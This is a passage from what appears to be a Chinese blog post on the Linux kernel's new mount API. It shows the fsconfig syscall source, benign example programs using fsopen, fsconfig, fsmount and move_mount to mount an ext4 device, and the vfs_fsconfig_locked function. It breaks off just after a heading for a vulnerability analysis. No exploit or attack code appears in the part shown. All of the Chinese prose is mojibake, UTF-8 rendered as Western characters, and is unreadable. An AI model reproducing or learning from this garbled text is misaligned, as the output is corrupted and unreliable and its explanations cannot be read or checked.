class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_FLAG:</span><br><span class="line"><span class="keyword">if</span> (!_key || _value || aux)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line"><span class="keyword">if</span> (!_key || !_value || aux)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line"><span class="keyword">if</span> (!_key || !_value || aux &lt;= <span class="number">0</span> || aux &gt; <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line"><span class="keyword">if</span> (!_key || !_value || (aux != AT_FDCWD &amp;&amp; aux &lt; <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line"><span class="keyword">if</span> (!_key || _value || aux &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_CMD_CREATE:</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_CMD_RECONFIGURE:</span><br><span class="line"><span class="keyword">if</span> (_key || _value || aux)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f = fdget(fd);</span><br><span class="line"><span class="keyword">if</span> (!f.file)</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)</span><br><span class="line"><span class="keyword">goto</span> out_f;</span><br><span class="line"></span><br><span class="line">fc = f.file-&gt;private_data;</span><br><span class="line"><span class="keyword">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123;</span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">ret = -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">goto</span> out_f;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (_key) &#123;</span><br><span class="line">param.key = strndup_user(_key, <span class="number">256</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(param.key)) &#123;</span><br><span class="line">ret = PTR_ERR(param.key);</span><br><span class="line"><span class="keyword">goto</span> out_f;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_FLAG:</span><br><span class="line">param.type = fs_value_is_flag;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line">param.type = fs_value_is_string;</span><br><span class="line">param.<span class="built_in">string</span> = strndup_user(_value, <span class="number">256</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(param.<span class="built_in">string</span>)) &#123;</span><br><span class="line">ret = PTR_ERR(param.<span class="built_in">string</span>);</span><br><span class="line"><span class="keyword">goto</span> out_key;</span><br><span class="line">&#125;</span><br><span class="line">param.size = <span class="built_in">strlen</span>(param.<span class="built_in">string</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">param.type = fs_value_is_blob;</span><br><span class="line">param.size = aux;</span><br><span class="line">param.blob = memdup_user_nul(_value, aux);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(param.blob)) &#123;</span><br><span class="line">ret = PTR_ERR(param.blob);</span><br><span class="line"><span class="keyword">goto</span> out_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line">param.type = fs_value_is_filename;</span><br><span class="line">param.name = getname_flags(_value, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(param.name)) &#123;</span><br><span class="line">ret = PTR_ERR(param.name);</span><br><span class="line"><span class="keyword">goto</span> out_key;</span><br><span class="line">&#125;</span><br><span class="line">param.dirfd = aux;</span><br><span class="line">param.size = <span class="built_in">strlen</span>(param.name-&gt;name);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line">param.type = fs_value_is_filename_empty;</span><br><span class="line">param.name = getname_flags(_value, LOOKUP_EMPTY, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(param.name)) &#123;</span><br><span class="line">ret = PTR_ERR(param.name);</span><br><span class="line"><span class="keyword">goto</span> out_key;</span><br><span class="line">&#125;</span><br><span class="line">param.dirfd = aux;</span><br><span class="line">param.size = <span class="built_in">strlen</span>(param.name-&gt;name);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line">param.type = fs_value_is_file;</span><br><span class="line">ret = -EBADF;</span><br><span class="line">param.file = fget(aux);</span><br><span class="line"><span class="keyword">if</span> (!param.file)</span><br><span class="line"><span class="keyword">goto</span> out_key;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">ret = vfs_fsconfig_locked(fc, cmd, &amp;param);</span><br><span class="line">mutex_unlock(&amp;fc-&gt;uapi_mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Clean up the our record of any value that we obtained from</span></span><br><span class="line"><span class="comment"> * userspace.  Note that the value may have been stolen by the LSM or</span></span><br><span class="line"><span class="comment"> * filesystem, in which case the value pointer will have been cleared.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_BINARY:</span><br><span class="line">kfree(param.<span class="built_in">string</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH:</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_PATH_EMPTY:</span><br><span class="line"><span class="keyword">if</span> (param.name)</span><br><span class="line">putname(param.name);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_SET_FD:</span><br><span class="line"><span class="keyword">if</span> (param.file)</span><br><span class="line">fput(param.file);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">out_key:</span><br><span class="line">kfree(param.key);</span><br><span class="line">out_f:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å‰é¢ä¸»è¦æ“ä½œæ˜¯å¯¹å‚æ•°è¿›è¡Œå„ç§æ£€æµ‹ï¼Œç´§æ¥ç€è·å–åˆ°æ–‡ä»¶æè¿°ç¬¦ï¼Œæ¥ç€è·å–<code>fs_config</code>ï¼Œéšåæ‹·è´keyå­—æ®µåˆ°å†…æ ¸ä¸­ï¼Œæœ€ç»ˆæ ¹æ®ä¸åŒçš„cmdè¿›å…¥switch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> FSCONFIG_SET_STRING:</span><br><span class="line">param.type = fs_value_is_string;</span><br><span class="line">param.<span class="built_in">string</span> = strndup_user(_value, <span class="number">256</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(param.<span class="built_in">string</span>)) &#123;</span><br><span class="line">ret = PTR_ERR(param.<span class="built_in">string</span>);</span><br><span class="line"><span class="keyword">goto</span> out_key;</span><br><span class="line">&#125;</span><br><span class="line">param.size = <span class="built_in">strlen</span>(param.<span class="built_in">string</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦å…³æ³¨è¿™ä¸€ä¸ªåˆ†æ”¯ï¼Œåœ¨åˆ†æ”¯ä¸­è®¾ç½®å®Œ<code>param</code>ä¹‹åè¿›å…¥åç»­æµç¨‹ï¼Œæœ€ç»ˆè¿›å…¥åˆ°<code>vfs_fsconfig_locked</code>å‡½æ•°è¿›è¡Œå¤„ç†ã€‚</p><h3 id="fsmount"><a href="#fsmount" class="headerlink" title="fsmount"></a>fsmount</h3><p>å®Œæˆäº†æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡çš„åˆ›å»ºä¸é…ç½®ï¼Œæ¥ä¸‹æ¥ç»ˆäºæ¥åˆ°æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½æ“ä½œäº†ï¼Œ<code>fsmount()</code> ç³»ç»Ÿè°ƒç”¨ç”¨ä»¥è·å–ä¸€ä¸ªå¯ä»¥è¢«ç”¨ä»¥è¿›è¡ŒæŒ‚è½½çš„æŒ‚è½½å®ä¾‹ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ç”¨ä»¥ä¸‹ä¸€æ­¥çš„æŒ‚è½½</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsconfig</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsconfig 431</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsmount</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsmount 432</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsmount</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">unsigned</span> <span class="keyword">int</span> ms_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd, mount_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;/dev/sdb1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="move-mount"><a href="#move-mount" class="headerlink" title="move_mount"></a>move_mount</h3><p>æœ€åä½¿ç”¨<code>move_mount</code>ç³»ç»Ÿè°ƒç”¨å°†æŒ‚è½½å®ä¾‹åœ¨æŒ‚è½½ç‚¹ä¹‹é—´ç§»åŠ¨ï¼Œå¯¹äºå°šæœªè¿›è¡ŒæŒ‚è½½çš„æŒ‚è½½å®ä¾‹è€Œè¨€ï¼Œè¿›è¡ŒæŒ‚è½½çš„æ“ä½œä¾¿æ˜¯ä»ç©ºæŒ‚è½½ç‚¹ <code>&quot;&quot;</code> ç§»åŠ¨åˆ°å¯¹åº”çš„æŒ‚è½½ç‚¹ï¼ˆä¾‹å¦‚ <code>&quot;/mnt/temp&quot;</code>ï¼‰ï¼Œæ­¤æ—¶æˆ‘ä»¬å¹¶ä¸éœ€è¦ç»™å‡ºç›®çš„æŒ‚è½½ç‚¹çš„ fdï¼Œè€Œå¯ä»¥ä½¿ç”¨ <code>AT_FDCWD</code>ï¼Œå¼•å…¥äº† <code>move_mount()</code> ä¹‹åï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ä¸€ä¸ªç”¨ä»¥å°† <code>&quot;/dev/sdb1&quot;</code> ä»¥ <code>&quot;ext4&quot;</code> æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ° <code>&quot;/mnt/temp&quot;</code> çš„å®Œæ•´ç¤ºä¾‹ç¨‹åºå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsconfig</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsconfig 431</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsmount</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsmount 432</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_move_mount</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_move_mount 429</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsmount</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">unsigned</span> <span class="keyword">int</span> ms_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">move_mount</span><span class="params">(<span class="keyword">int</span> from_dfd, <span class="keyword">const</span> <span class="keyword">char</span> *from_pathname,<span class="keyword">int</span> to_dfd, </span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="keyword">const</span> <span class="keyword">char</span> *to_pathname, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_move_mount, from_dfd, from_pathname, to_dfd, to_pathname, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd, mount_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;/dev/sdb1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);</span><br><span class="line">    move_mount(mount_fd, <span class="string">&quot;&quot;</span>, AT_FDCWD, <span class="string">&quot;/mnt/temp&quot;</span>, MOVE_MOUNT_F_EMPTY_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>è¿™é‡Œä»‹ç»å‡ ä¹å°±æ˜¯ç…§æŠ„a3å’ŒçŸ¥ä¹çš„æ–‡ç« </del></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å‰é¢æåˆ°åœ¨<code>fsconfig</code>å‡½æ•°ä¸­ï¼Œæœ€ç»ˆä¼šè°ƒç”¨<code>vfs_fsconfig_locked</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">vfs_fsconfig_locked</span><span class="params">(struct fs_context *fc, <span class="keyword">int</span> cmd,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct fs_parameter *param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = finish_clean_context(fc);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_CMD_CREATE:</span><br><span class="line"><span class="keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS)</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"><span class="keyword">if</span> (!mount_capable(fc))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line">fc-&gt;phase = FS_CONTEXT_CREATING;</span><br><span class="line">ret = vfs_get_tree(fc);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">sb = fc-&gt;root-&gt;d_sb;</span><br><span class="line">ret = security_sb_kern_mount(sb);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret)) &#123;</span><br><span class="line">fc_drop_locked(fc);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">up_write(&amp;sb-&gt;s_umount);</span><br><span class="line">fc-&gt;phase = FS_CONTEXT_AWAITING_MOUNT;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> FSCONFIG_CMD_RECONFIGURE:</span><br><span class="line"><span class="keyword">if</span> (fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line">fc-&gt;phase = FS_CONTEXT_RECONFIGURING;</span><br><span class="line">sb = fc-&gt;root-&gt;d_sb;</span><br><span class="line"><span class="keyword">if</span> (!ns_capable(sb-&gt;s_user_ns, CAP_SYS_ADMIN)) &#123;</span><br><span class="line">ret = -EPERM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">down_write(&amp;sb-&gt;s_umount);</span><br><span class="line">ret = reconfigure_super(fc);</span><br><span class="line">up_write(&amp;sb-&gt;s_umount);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">vfs_clean_context(fc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS &amp;&amp;</span><br><span class="line">    fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> vfs_parse_fs_param(fc, param);</span><br><span class="line">&#125;</span><br><span class="line">fc-&gt;phase = FS_CONTEXT_FAILED;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span 